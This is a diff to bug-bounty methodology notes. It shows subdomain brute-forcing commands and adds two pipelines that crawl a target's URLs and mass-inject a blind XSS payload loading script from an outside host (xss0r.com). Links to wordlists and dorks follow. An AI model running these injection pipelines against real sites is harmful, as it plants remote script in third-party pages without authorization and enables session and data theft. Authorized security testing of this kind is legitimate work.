@@ -3,6 +3,11 @@ Bug Hunting methodology For Beginner
 dnsbruter -d BRUT.abc.xyz -w best-dns-wordlist.txt -c 300 -wt 100 -o domains.txt -ws wild.txt
 dnsbruter -d BRUT.abc.xyz -w subdomains-top1million-5000.txt -c 300 -wt 100 -o domains.txt -ws wild.txt
 
+--------------------
+cat abc.com.txt | httpx -silent | katana -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss0r.com/c/lostsec></script>' -parameters
+cat subdomains.txt | httpx -silent | katana -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss0r.com/c/lostsec></script>\'
+---------------------
+
 https://raw.githubusercontent.com/abdallaabdalrhman/Wordlist-for-Bug-Bounty/refs/heads/main/great_wordlist_for_bug_bounty.txt
 https://github.com/SecShiv/OneDorkForAll/tree/main/dorks/1M_dork
 
